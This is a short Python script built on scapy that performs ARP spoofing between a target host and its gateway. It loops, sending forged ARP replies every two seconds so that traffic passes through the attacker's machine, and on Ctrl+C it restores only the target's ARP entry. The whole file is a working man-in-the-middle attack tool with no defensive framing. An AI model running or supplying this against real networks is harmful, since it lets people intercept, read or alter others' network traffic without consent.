import scapy.all as scapy
import optparse
import time

def get_argments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='targetIP', help='Enter Target IP')
    parser.add_option('-g', '--gateway', dest='gatewayIP', help='Enter gateway IP')
    options, attributes = parser.parse_args()
    if not options.targetIP:
        parser.error('Please Enter target IP')
    if not options.gatewayIP:
        parser.error('Please Enter gateway IP')
    return options

def get_MAC(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_packet = broadcast/arp_packet
    answered, unanswered = scapy.srp(broadcast_arp_packet, timeout=1, verbose=False)
    return answered[0][1].hwsrc

def spoof_restore(targetIP, destinationIP, restore):
    targetMAC = get_MAC(targetIP)
    arp_packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=destinationIP)
    if restore:
        gatewayMAC = get_MAC(destinationIP)
        arp_packet.hwsrc = gatewayMAC
        scapy.send(arp_packet, count=4, verbose=False)
    else:
        scapy.send(arp_packet, verbose=False)

options = get_argments()
targetIP = options.targetIP
gatewayIP = options.gatewayIP

try:
    counter = 2
    while True:
        spoof_restore(targetIP, gatewayIP, False)
        spoof_restore(gatewayIP, targetIP, False)
        print('\r [+] - packets sent - ' + str(counter), end='')
        counter += 2
        time.sleep(2)
except KeyboardInterrupt:
    print('\n \n [+] - Pressed CTRL + C ... Quitting')
    spoof_restore(targetIP, gatewayIP, True)